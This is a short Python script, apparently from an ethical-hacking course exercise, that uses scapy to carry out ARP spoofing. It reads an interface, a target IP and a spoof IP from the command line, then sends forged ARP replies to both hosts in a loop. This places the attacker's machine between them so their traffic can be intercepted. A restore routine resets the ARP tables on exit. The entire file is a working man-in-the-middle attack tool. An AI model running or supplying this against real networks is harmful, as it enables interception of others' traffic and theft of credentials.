#!/usr/bin/env python

import scapy.all as scapy
import time, sys
import argparse

# Create function to pass arguments while calling the program
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Set Interface")
    parser.add_argument("-t", "--dest-ip", dest="dest_ip", help="Destination IP Address")
    parser.add_argument("-s", "--spoof-ip", dest="spoof_ip", help="Spoof IP Address")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface using -i or --interface options, use --help for more info.")
    elif not options.dest_ip:
        parser.error("[-] Please specify a destination ip address using -t or --dest-ip options, use --help for more info.")
    elif not options.spoof_ip:
        parser.error("[-] Please specify a spoof ip address using -s or --spoof-ip options, use --help for more info.")
    return options

def get_mac(ip, interface):
    arp_req = scapy.ARP(pdst=ip)    # get an arp request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")    # Set the destination mac address
    arp_broadcast = broadcast/arp_req   # combine the broadcast and request to send to the network
    answered = scapy.srp(arp_broadcast, iface=interface, timeout=1, verbose=False)[0]    # (scapy.srp) send and respond + allow ether frame for the answered resquests
    # return answered[0][1].hwsrc
    mac_address = None
    for element in answered:
        mac_address = element[1].hwsrc
    return mac_address

# function to send spoof ip packets to a destination address
def spoof(dest_ip, spoof_ip, interface):
    dest_mac = get_mac(dest_ip, interface)
    packet = scapy.ARP(op = 2, pdst = dest_ip, hwdst = dest_mac, psrc = spoof_ip)
    scapy.send(packet, iface=interface, verbose=False)

# function to restore the arp table to its original state before spoofing
def restore(dst_ip, src_ip, interface):
    dst_mac = get_mac(dst_ip, interface)
    src_mac = get_mac(src_ip, interface)
    packet = scapy.ARP(op = 2, pdst = dst_ip, hwdst = dst_mac, psrc = src_ip, hwsrc = src_mac)
    scapy.send(packet, iface=interface, count=4, verbose=False)


if __name__ == "__main__":
    options = get_arguments() # retrieve arguments passed while calling the program
    count = 0
    try:
        while True:
            spoof(options.dest_ip, options.spoof_ip, options.interface)    # Send spoof ip to the destination
            spoof(options.spoof_ip, options.dest_ip, options.interface)    # Send a reverse spoof ip to the src
            count += 2
            print("\r[+] Packets sent: " + str(count), end="")  # print recursively packet count sent
            time.sleep(2)   # Sleep for 2 seconds between packets sent
    except KeyboardInterrupt:
        # Call the restore function when CTRL + C is pressed
        print("\n[-] Detected keyboard interupt - Quiting...")
        print("\n[+] Restoring ARP Table...")
        restore(options.dest_ip, options.spoof_ip, options.interface)
        restore(options.spoof_ip, options.dest_ip, options.interface)
        print("\n[+] ARP Table restored")
